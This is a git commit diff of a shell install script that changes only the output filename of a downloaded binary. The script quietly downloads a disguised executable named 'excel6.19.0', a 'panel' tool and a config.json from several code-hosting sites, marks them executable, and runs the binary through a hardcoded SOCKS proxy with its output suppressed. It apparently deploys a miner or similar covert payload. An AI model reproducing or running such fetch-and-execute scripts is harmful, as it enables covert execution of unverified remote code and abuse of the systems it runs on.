c348d88fc3cfd98fc0a6c99ffd5c09e912d39d3f
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-02 21:37:30 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -2,7 +2,7 @@ proxy="149.50.222.86"
 port="1080" 
 user="render"  
 pass="render"   
-wget -q -O 478234556423 https://gitlab.com/55113110159/dokerweb/-/raw/main/excel6.19.0 && chmod +x 478234556423
+wget -q -O 894236723178 https://gitlab.com/55113110159/dokerweb/-/raw/main/excel6.19.0 && chmod +x 894236723178
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
@@ -21,4 +21,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./478234556423 -c "config.json" >/dev/null 2>&1
+./panel ./894236723178 -c "config.json" >/dev/null 2>&1
